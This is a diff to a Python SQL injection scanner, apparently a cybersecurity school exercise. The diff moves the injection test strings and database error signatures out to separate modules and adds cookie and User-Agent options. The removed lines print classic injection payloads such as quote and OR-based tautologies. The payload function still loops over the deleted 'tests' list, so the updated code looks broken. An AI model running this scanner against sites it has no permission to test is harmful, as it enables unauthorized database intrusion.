@@ -1,4 +1,3 @@
-#!/goinfre/alvgomez/miniconda3/envs/42cyber-alvgomez/bin/python
 
 import requests
 import argparse
@@ -6,36 +5,20 @@ from bs4 import BeautifulSoup
 import os
 from urllib.parse import urljoin
 from pprint import pprint
+from payloads import payloads
+from errors import errors
 
 requests_types = ["GET", "POST", "PUT", "DELETE", "TRACE", "OPTIONS", "CONNECT", "PATCH"]
 
-tests = ["\'",
-        "\'\'",
-        "`",
-        "``",
-        ",",
-        "\"",
-        "\"\"",
-        "/",
-        "//",
-        "\\",
-        "\\\\",
-        ";",
-        "\' or \"",
-        "-- or # ",
-        "\' OR \'1",
-        "\' OR 1 -- -",
-        "\" OR "" = \"",
-        "\" OR 1 = 1 -- -\"",
-        "\' OR \'\' = \'",
-        "\'=\'"]
-
+s = requests.Session()
 
 def parse_arguments():
     parser = argparse.ArgumentParser(description="perform SQL injection by providing a url as a parameter")
     parser.add_argument('-o', "--file", type=str, action="store", help="Archive file, if not specified it will be stored in './vaccine_results.txt'")
     parser.add_argument('-X', "--request", type=str, action="store", help="Type of request, if not specified GET will be used")
-    parser.add_argument('url', type=str, nargs=2, help="Url of the potentialy vulnerable page")
+    parser.add_argument('-c', "--cookies", type=str, action="store", help="Cookie of the sesion in case it is needed")
+    parser.add_argument('-u', "--user", type=str, action="store", help="User-Agent of the client")
+    parser.add_argument('url', type=str, nargs=1, help="Url of the potentialy vulnerable page")
     arg = parser.parse_args()
     if not arg.request:
         arg.request = "GET"
@@ -45,6 +28,17 @@ def parse_arguments():
             exit()
     if not arg.file:
         arg.file = "./vaccine_results.txt"
+    if arg.user:
+        s.headers['User-Agent'] = arg.user
+    else:
+        s.headers['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
+    if arg.cookies:
+        try:
+            cookie = arg.cookies.split("=")
+            s.cookies.set(cookie[0], cookie[1])
+        except:
+            print("Cookies must be: <name>=<value>")
+            exit()
     return arg
 
 def get_forms(url):
@@ -75,22 +69,23 @@ def form_details(form):
     return details_of_form
 
 def vulnerable(response):
-    errors = {
-        # MySQL
-        "you have an error in your sql syntax;",
-        "warning: mysql",
-        # SQL Server
-        "unclosed quotation mark after the character string",
-        # Oracle
-        "quoted string not properly terminated",
-    }
+    #manipulate the dictionary
     for error in errors:
-        if error in response.content.decode().lower():
-            return True
+        try:
+            if error in response.content.decode().lower():
+                return True
+        except:
+            if error in response.content.decode("Latin-1").lower():
+                return True
     return False
 
 def payload(url, data, details):
+    #manipulate the payloads dictionary
+    flag = 0
     for key, value in data.items():
+        if flag == 1:
+            flag = 0
+            break
         for i in tests:
             data[key] = i
             res = None
@@ -104,8 +99,9 @@ def payload(url, data, details):
                 if len(pre) != 0:
                     print("[+] Form:")
                     pprint(pre)
-                    return
-
+                    print()
+                    flag = 1
+        
 def sql_injection(url):
     for i in "\"'":
         new_url = f"{url}{i}"
@@ -131,7 +127,7 @@ def sql_injection(url):
                     # all others except submit, use some junk data with special character
                     data[tag["name"]] = f"test{i}"
             res = None
-            url = urljoin(url, details["action"])
+            #url = urljoin(url, details["action"])
             if details["method"] == "post":
                 res = s.post(url, data=data)
             elif details["method"] == "get":
@@ -145,12 +141,6 @@ def sql_injection(url):
 if __name__ == "__main__":
     arg = parse_arguments()
 
-    s = requests.Session()
-    s.headers['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
-    
-    cookie = arg.url[1].split("=")
-    s.cookies.set(cookie[0], cookie[1])
-    
-    sql_injection(arg.url[0])
+    sql_injection(arg.url)
 
     
